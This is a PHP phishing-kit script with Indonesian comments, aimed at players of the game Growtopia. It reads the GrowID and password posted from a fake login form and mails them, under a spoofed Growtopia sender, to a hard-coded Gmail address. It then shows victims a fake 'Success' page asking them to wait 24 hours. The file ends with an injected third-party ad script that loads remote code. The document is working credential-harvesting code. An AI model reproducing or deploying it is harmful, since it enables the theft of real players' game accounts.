<?php
############################################
##        Author: Achmad Fajar            ##
##       Mailer: /Fajar Tamvan               ##
##   Modifer:droidpalacez.blogspot.com         ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'Akun GrowID Bos';
$mailto = 'bocahceplak@gmail.com'; //masukin email lo disini

/* Fungsi berikut untuk mengambil input field. */

$GrowID = $_POST['GrowID'];
$paswot = $_POST['password'];



$body = <<<EOD
<br><hr><br>

GrowID : <font color="green">$GrowID</font> <br>
Password : <font color="blue">$paswot</font> <br>
EOD;


$headers = "From: Growtopia@System.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<title>Success</title>
    <script src="//use.edgefonts.net/bebas-neue.js"></script> 
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.superhero.css">
    
    
    
        <link rel="stylesheet" href="css/styles.css">

    
    
    
  </head>

  <body>
<center>
    <script src="//use.edgefonts.net/bebas-neue.js"></script> 

<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
  <div class="title">Success</div>
  <br/>
<br/>
<br/>
<br/>
  <div class="title2">Congratulations. Please wait for 24 hours,</div>
  <br/>
  <div class="title2">and look at your account.</div>
  <br/>
  <a href="/"><button id="X00ButtonStart" class="btn btn-primary" type="button" style=""><b>Back To Home!</b></button></a>
</center>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.6.1/jquery.lettering.min.js'></script>

        <script src="js/index.js"></script>

    
    
    
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bqWuUApwhmSaPMr3w7k24wNPlnzTSJmvS6cA6uKUegJwKNFXY5CuXVUmRTHZ3ULBs5yU2HBR5320IF6xRYdDXaIMeqm%2bCg4LoKoPzetgnVX0IXETd8NAHW9QoCJmk%2fqScTJo2Y8wQWRRQBXwGMOxMXWg%2f78B2hynoyDo0e2Z74zMF2B%2beDR81cxcif%2f427a1ESomJGE%2fPfhaJKMKnDnWPK1PHIUWR8Vyvvgxwuwo8Lc3jHjmkt9r%2foGGY3Qiz%2bfCioKAwWBjlYE9bPoa%2fcbnJggwTHhxk06674JwQG%2bBA4u4VYg1QQxnJ49oN3PFHSTCb52ahgYprmHZGCnqD0ivQ%2fA6Sg2g0nStSBTJVEofXnd3BN6n1PK9NbTZo4FRgeQ2gw7g1ByFgoiCLRjuZzFQGIPftq5QiST7MbqH%2b1w05H%2bEwvN2Rst3%2fuqbT%2fGhXrgbnh0QHaLK9EQHX783JAUB74MB9cI%2bhlmcxHdKB0Io3MAQ6M3WLFW8bS8ZUShzQKnEjhZ6JSBfO6wPjl5rgH6KPeBioXbaNMPSCitnqwt2LzHc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>